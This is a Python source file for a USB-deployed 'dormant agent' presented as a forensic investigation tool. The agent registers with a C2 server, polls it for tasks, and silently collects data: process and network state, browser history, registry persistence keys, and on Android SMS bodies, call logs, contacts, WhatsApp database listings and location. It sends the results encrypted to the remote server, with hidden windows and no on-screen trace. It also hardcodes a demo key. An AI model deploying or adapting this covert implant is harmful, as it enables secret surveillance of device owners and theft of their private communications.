"""
agent/agent_core.py -- JOCKY Dormant Agent Core
================================================
This is the agent that gets deployed via USB.
It sits DORMANT after install — does NOTHING until
the investigator sends a task from the dashboard.

States:
  DORMANT   → installed, connected to C2, waiting for tasks
  RUNNING   → executing a task from investigator
  IDLE      → task complete, back to waiting

The investigator NEVER sees agent activity on the target screen.
All output goes encrypted to C2.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import os
import platform
import secrets
import socket
import struct
import sys
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib  import Path
from typing   import Any, Dict, List, Optional

log = logging.getLogger("jocky.agent")

# ── AES-256-GCM (self-contained, no external deps beyond cryptography) ─────────
class _Cipher:
    def __init__(self, key: bytes):
        self._key = key
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM(key)
        except ImportError:
            self._aesgcm = None

    def encrypt(self, pt: bytes, aad: bytes = b"") -> bytes:
        nonce = secrets.token_bytes(12)
        if self._aesgcm:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return nonce + AESGCM(self._key).encrypt(nonce, pt, aad or None)
        raise RuntimeError("pip install cryptography")

    def decrypt(self, data: bytes, aad: bytes = b"") -> bytes:
        nonce, ct = data[:12], data[12:]
        if self._aesgcm:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(self._key).decrypt(nonce, ct, aad or None)
        raise RuntimeError("pip install cryptography")

def _derive_key(psk: bytes, agent_id: str) -> bytes:
    prk = hmac.new(b"jocky-salt-v1", psk, hashlib.sha256).digest()
    return hmac.new(prk, agent_id.encode() + b"\x01", hashlib.sha256).digest()

def _utcnow() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def _agent_id() -> str:
    try:
        import uuid
        seed = f"{socket.gethostname()}-{uuid.getnode()}"
    except Exception:
        seed = socket.gethostname()
    return "jocky-" + hashlib.sha256(seed.encode()).hexdigest()[:8]

# ── platform detection ─────────────────────────────────────────────────────────
def _platform() -> str:
    s = platform.system().lower()
    if s == "windows": return "windows"
    if s == "linux":
        # check if Android
        try:
            if Path("/system/build.prop").exists(): return "android"
        except Exception: pass
        return "linux"
    if s == "darwin": return "macos"
    return s

# ── collector imports (lazy — only import what exists on platform) ─────────────
def _import_collector():
    """Try to import collector from multiple locations."""
    for path in [
        Path(__file__).parent / "collector.py",
        Path(__file__).parent.parent / "agent" / "collector.py",
        Path(sys.argv[0]).parent / "collector.py",
    ]:
        if path.exists():
            import importlib.util
            spec = importlib.util.spec_from_file_location("collector", path)
            mod  = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    return None

# ── task execution ─────────────────────────────────────────────────────────────
class TaskExecutor:
    """
    Receives a task dict from C2 and executes the specified collectors.
    Only runs what the investigator's .jky script specified.
    """

    def __init__(self, platform_str: str):
        self._platform = platform_str
        self._collector_mod = _import_collector()

    def execute(self, task: dict) -> dict:
        collectors = task.get("collectors", [])
        filters    = task.get("filters",    [])
        flags      = task.get("flags",      [])
        case_id    = task.get("case_id",    "UNKNOWN")

        log.info(f"[executor] task received: collectors={collectors}")

        results: Dict[str, Any] = {}
        errors:  Dict[str, str] = {}

        for cname in collectors:
            try:
                result = self._run_collector(cname)
                results[cname] = result
                log.info(f"[executor] {cname}: OK  ({len(str(result))} bytes)")
            except Exception as e:
                errors[cname] = str(e)
                log.warning(f"[executor] {cname}: FAILED  {e}")

        # apply filters and flags
        results = self._apply_filters(results, filters)
        results = self._apply_flags(results, flags)

        return {
            "case_id":      case_id,
            "agent_id":     task.get("agent_id",""),
            "executed_at":  _utcnow(),
            "platform":     self._platform,
            "collectors":   list(results.keys()),
            "evidence":     results,
            "errors":       errors,
            "suspicious":   self._count_suspicious(results),
        }

    def _run_collector(self, name: str) -> Any:
        """Run a single collector by name."""
        if self._collector_mod and hasattr(self._collector_mod, name):
            fn = getattr(self._collector_mod, name)
            return fn()

        # platform-specific fallbacks
        if self._platform == "windows":
            return self._windows_fallback(name)
        elif self._platform == "android":
            return self._android_collector(name)
        else:
            return {"error": f"no collector for {name} on {self._platform}"}

    def _windows_fallback(self, name: str) -> Any:
        """Lightweight Windows collectors using only stdlib."""
        import subprocess

        def run(cmd):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=15, creationflags=0x08000000)
                return r.stdout.strip()
            except Exception: return ""

        if name == "proc_list":
            out = run(["tasklist","/FO","CSV"])
            procs = []
            for line in out.splitlines()[1:]:
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 2:
                    procs.append({"name":parts[0],"pid":parts[1]})
            return {"count":len(procs),"processes":procs}

        if name == "net_state":
            out = run(["netstat","-ano"])
            conns = []
            ext = []
            for line in out.splitlines():
                p = line.split()
                if len(p) >= 4 and p[0] in ("TCP","UDP"):
                    remote = p[2] if len(p) > 2 else ""
                    ip = remote.rsplit(":",1)[0].strip("[]")
                    if ip and not ip.startswith(("127.","0.0.0.0","::1","10.","192.168.")):
                        ext.append(ip)
                    conns.append({"proto":p[0],"local":p[1],"remote":remote})
            return {"total":len(conns),"external_ips":list(set(ext)),"connections":conns[:50]}

        if name == "reg_persistence":
            import winreg
            result = {}
            keys = [
                (winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            ]
            for hive, path in keys:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                    vals = {}
                    i = 0
                    while True:
                        try: n,d,_ = winreg.EnumValue(key,i); vals[n]=str(d); i+=1
                        except OSError: break
                    label = ("HKLM" if hive==winreg.HKEY_LOCAL_MACHINE else "HKCU")+"\\"+path.split("\\")[-1]
                    result[label] = vals
                    winreg.CloseKey(key)
                except Exception: pass
            suspicious = sum(
                1 for vals in result.values()
                for v in vals.values()
                if any(s in str(v).lower() for s in ["powershell","cmd.exe","temp","appdata"])
            )
            return {"keys":result,"suspicious":suspicious}

        if name == "browser_hist":
            import sqlite3, shutil, tempfile
            results = {"urls":[],"errors":[]}
            profiles = {
                "Chrome": Path(os.environ.get("LOCALAPPDATA","")) / "Google/Chrome/User Data/Default/History",
                "Edge":   Path(os.environ.get("LOCALAPPDATA","")) / "Microsoft/Edge/User Data/Default/History",
            }
            for browser, db in profiles.items():
                if not db.exists(): continue
                try:
                    tmp = tempfile.mktemp(suffix=".db")
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    for row in cur.fetchall():
                        results["urls"].append({"browser":browser,"url":row[0],"title":row[1],"visits":row[2]})
                    conn.close()
                    os.unlink(tmp)
                except Exception as e:
                    results["errors"].append(f"{browser}: {e}")
            results["count"] = len(results["urls"])
            return results

        if name == "event_log":
            out = run(["wevtutil","qe","Security","/c:30","/rd:true","/f:text"])
            events = []
            for block in out.split("Event["):
                if not block.strip(): continue
                import re
                eid = re.search(r"EventID:\s*(\d+)", block)
                events.append({"event_id":int(eid.group(1)) if eid else 0,"text":block[:200]})
            return {"count":len(events),"events":events}

        if name == "usb_history":
            try:
                import winreg
                devices = []
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                     r"SYSTEM\CurrentControlSet\Enum\USBSTOR",0,winreg.KEY_READ)
                i=0
                while True:
                    try:
                        dc = winreg.EnumKey(key,i); i+=1
                        devices.append({"device":dc})
                    except OSError: break
                winreg.CloseKey(key)
                return {"count":len(devices),"devices":devices}
            except Exception as e:
                return {"count":0,"error":str(e)}

        if name == "scheduled_tasks":
            out = run(["schtasks","/query","/FO","CSV"])
            tasks = []
            suspicious = 0
            for line in out.splitlines()[1:]:
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 2:
                    name_t = parts[0]
                    status = parts[2] if len(parts)>2 else ""
                    t = {"name":name_t,"status":status}
                    if any(s in name_t.lower() for s in ["temp","update","microsoft"]):
                        pass
                    tasks.append(t)
            return {"count":len(tasks),"suspicious":suspicious,"tasks":tasks[:50]}

        if name == "prefetch":
            pf = Path(r"C:\Windows\Prefetch")
            if not pf.exists(): return {"count":0,"note":"Prefetch not found"}
            entries = [{"name":f.stem,"size":f.stat().st_size}
                       for f in sorted(pf.glob("*.pf"))[:100]]
            return {"count":len(entries),"entries":entries}

        if name == "dns_cache":
            out = run(["ipconfig","/displaydns"])
            domains = []
            import re
            for m in re.finditer(r"Record Name\s*\.+\s*:\s*(.+)", out):
                domains.append(m.group(1).strip())
            return {"count":len(domains),"domains":list(set(domains))[:100]}

        return {"note":f"collector {name} not implemented on windows fallback"}

    def _android_collector(self, name: str) -> Any:
        """Android collectors via ADB shell commands."""
        import subprocess

        def adb(cmd: list) -> str:
            try:
                r = subprocess.run(["adb","shell"]+cmd,
                                   capture_output=True,text=True,timeout=15)
                return r.stdout.strip()
            except Exception: return ""

        if name == "proc_list":
            out = adb(["ps","-A"])
            procs = [{"line":l} for l in out.splitlines()[1:]]
            return {"count":len(procs),"processes":procs[:50]}

        if name == "net_state":
            out = adb(["netstat","-an"])
            conns = [{"line":l} for l in out.splitlines() if "ESTABLISHED" in l]
            return {"total":len(conns),"connections":conns[:50]}

        if name == "installed_apps":
            out = adb(["pm","list","packages","-f","--include-uninstalled"])
            pkgs = [l.replace("package:","") for l in out.splitlines() if l.startswith("package:")]
            return {"count":len(pkgs),"packages":pkgs[:100]}

        if name == "call_log":
            out = adb(["content","query","--uri","content://call_log/calls",
                       "--projection","number:date:duration:type"])
            return {"raw":out[:2000]}

        if name == "sms_history":
            out = adb(["content","query","--uri","content://sms",
                       "--projection","address:date:body"])
            return {"raw":out[:2000]}

        if name == "contacts":
            out = adb(["content","query","--uri","content://contacts/phones",
                       "--projection","display_name:number"])
            return {"raw":out[:2000]}

        if name == "browser_hist":
            # Chrome on Android
            out = adb(["run-as","com.android.chrome","cat",
                       "/data/data/com.android.chrome/app_chrome/Default/History"])
            return {"note":"Android browser history","bytes":len(out)}

        if name == "whatsapp_db":
            out = adb(["run-as","com.whatsapp","ls",
                       "/data/data/com.whatsapp/databases/"])
            return {"databases":out.splitlines()}

        if name == "location_history":
            out = adb(["content","query","--uri",
                       "content://com.google.android.apps.maps/","--projection","*"])
            return {"raw":out[:1000]}

        return {"note":f"android collector {name} — adb shell command not implemented"}

    def _apply_filters(self, results: dict, filters: list) -> dict:
        """Store filter rules alongside results for dashboard display."""
        if filters:
            results["_applied_filters"] = filters
        return results

    def _apply_flags(self, results: dict, flags: list) -> dict:
        """Count total suspicious items across all collectors."""
        total_suspicious = 0
        for key, val in results.items():
            if isinstance(val, dict):
                total_suspicious += val.get("suspicious", 0)
        results["_total_suspicious"] = total_suspicious
        return results

    def _count_suspicious(self, results: dict) -> int:
        return results.get("_total_suspicious", 0)


# ── dormant agent ──────────────────────────────────────────────────────────────
class DormantAgent:
    """
    USB-deployed agent that:
    1. Connects to C2 and registers (DORMANT state)
    2. Polls for tasks every N seconds
    3. Executes tasks ONLY when investigator dispatches them
    4. Returns encrypted results to C2
    5. Goes back to DORMANT after each task
    """

    POLL_INTERVAL = 15   # seconds between task polls

    def __init__(self, c2_url: str, psk: bytes,
                 agent_id: Optional[str] = None,
                 usb_deploy: bool = False):
        self.c2_url    = c2_url.rstrip("/")
        self.psk       = psk
        self.agent_id  = agent_id or _agent_id()
        self.platform  = _platform()
        self.usb_deploy= usb_deploy
        self._running  = False
        self._state    = "DORMANT"
        self._seq      = 0
        self._cipher   = _Cipher(_derive_key(psk, self.agent_id))
        self._executor = TaskExecutor(self.platform)

        log.info(f"[agent] id={self.agent_id} platform={self.platform}")
        log.info(f"[agent] c2={self.c2_url}")
        if usb_deploy:
            log.info("[agent] USB deploy mode — running silently")

    def _post(self, path: str, data: dict) -> Optional[dict]:
        body = json.dumps(data, default=str).encode()
        req  = urllib.request.Request(
            f"{self.c2_url}{path}", data=body,
            headers={"Content-Type":"application/json",
                     "User-Agent":f"JOCKY-Agent/{self.agent_id}"},
            method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read())
        except Exception as e:
            log.debug(f"POST {path}: {e}")
            return None

    def _get(self, path: str) -> Optional[dict]:
        try:
            with urllib.request.urlopen(
                    f"{self.c2_url}{path}", timeout=10) as r:
                return json.loads(r.read())
        except Exception as e:
            log.debug(f"GET {path}: {e}")
            return None

    def _checkin(self) -> bool:
        resp = self._post("/api/checkin", {
            "agent_id":  self.agent_id,
            "hostname":  socket.gethostname(),
            "platform":  self.platform,
            "state":     self._state,
            "timestamp": _utcnow(),
        })
        return resp is not None and resp.get("ok", False)

    def _poll_task(self) -> Optional[dict]:
        """Check C2 for a pending task for this agent."""
        resp = self._get(f"/api/task/pending/{self.agent_id}")
        if resp and resp.get("task"):
            return resp["task"]
        return None

    def _submit_result(self, result: dict) -> bool:
        """Encrypt and POST evidence result to C2."""
        self._seq += 1
        MAGIC = 0x4A4F4B59
        payload_bytes = json.dumps(result, default=str).encode()
        header = struct.pack(">III", MAGIC, 0x03, len(payload_bytes))
        seq_b  = struct.pack(">I", self._seq)
        pt     = header + payload_bytes + seq_b
        ct     = self._cipher.encrypt(pt, aad=self.agent_id.encode())
        data   = base64.b64encode(ct).decode()

        resp = self._post("/api/evidence", {
            "agent_id":      self.agent_id,
            "seq":           self._seq,
            "data":          data,
            "plain_summary": {
                "hostname":   socket.gethostname(),
                "collectors": result.get("collectors",[]),
                "suspicious": result.get("suspicious",0),
                "case_id":    result.get("case_id",""),
            }
        })
        return resp is not None

    def start(self):
        """Start the dormant agent loop."""
        self._running = True
        self._state   = "DORMANT"

        # initial checkin
        log.info("[agent] checking in with C2...")
        ok = self._checkin()
        if ok:
            log.info("[agent] registered — DORMANT, waiting for tasks")
        else:
            log.warning("[agent] checkin failed — will retry")

        while self._running:
            try:
                self._loop_once()
            except Exception as e:
                log.error(f"[agent] loop error: {e}")
            time.sleep(self.POLL_INTERVAL)

    def _loop_once(self):
        # periodic checkin
        self._checkin()

        # check for pending task
        task = self._poll_task()
        if not task:
            return  # still DORMANT

        # execute task
        log.info(f"[agent] task received: {task.get('collectors',[])} — RUNNING")
        self._state = "RUNNING"
        task["agent_id"] = self.agent_id

        result = self._executor.execute(task)
        log.info(f"[agent] task complete — evidence={len(result.get('evidence',{}))} "
                 f"suspicious={result.get('suspicious',0)}")

        # submit result
        ok = self._submit_result(result)
        log.info(f"[agent] result submitted: {'OK' if ok else 'FAILED'}")

        # back to dormant
        self._state = "DORMANT"

    def stop(self):
        self._running = False


# ── entry point ────────────────────────────────────────────────────────────────
def main():
    import argparse
    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s: %(message)s"
    )
    ap = argparse.ArgumentParser(prog="jocky_agent_core")
    ap.add_argument("--c2",          required=True)
    ap.add_argument("--psk",         default="JOCKY_DEMO_PSK_32_BYTES_12345678")
    ap.add_argument("--id",          default=None)
    ap.add_argument("--usb-deploy",  action="store_true")
    ap.add_argument("--interval",    type=int, default=15)
    args = ap.parse_args()

    psk = args.psk.encode()[:32].ljust(32, b"\x00")
    agent = DormantAgent(
        c2_url     = args.c2,
        psk        = psk,
        agent_id   = args.id,
        usb_deploy = args.usb_deploy,
    )
    agent.POLL_INTERVAL = args.interval

    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()
        log.info("[agent] stopped")

if __name__ == "__main__":
    main()
